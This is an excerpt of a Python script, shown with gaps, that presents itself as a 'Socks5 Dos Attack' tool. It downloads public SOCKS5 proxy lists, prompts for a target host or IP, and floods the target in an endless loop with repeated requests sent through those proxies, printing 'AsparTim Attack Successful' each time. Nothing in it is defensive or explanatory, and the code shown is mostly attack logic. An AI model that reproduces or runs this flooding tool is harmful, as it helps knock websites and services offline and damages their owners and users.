...
------------------------------- """)
print(" ")
print(Fore.WHITE + "Socks5 Dos Attack")
...
def clone(): 
	r = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all&anonymity=all&timeout=2000')
...
def main(): 
	...
	global per
	global uu
	url = str(input('[+] Target / IP (Ex. www.google.com ) : '))
	if url =='':
	...
	if uu=='':
		uu ='/'
	gt = str(input('[+] Do You Want To Download Socks5 ? (y/n) : '))
	if gt =='y':
		clone()
	else:
		pass
...
def atk(): 
	...
	while True:
		try:
			...
			print(Fore.GREEN + "AsparTim Attack Successful [" + Fore.WHITE + str(proxy[0])+":"+str(proxy[1])+ Fore.GREEN + "]")
			try:
				for y in range(per):
					s.send(str.encode(request))
				print(Fore.GREEN + "AsparTim Attack Successful [" + Fore.WHITE + str(proxy[0])+":"+str(proxy[1])+ Fore.GREEN + "]")
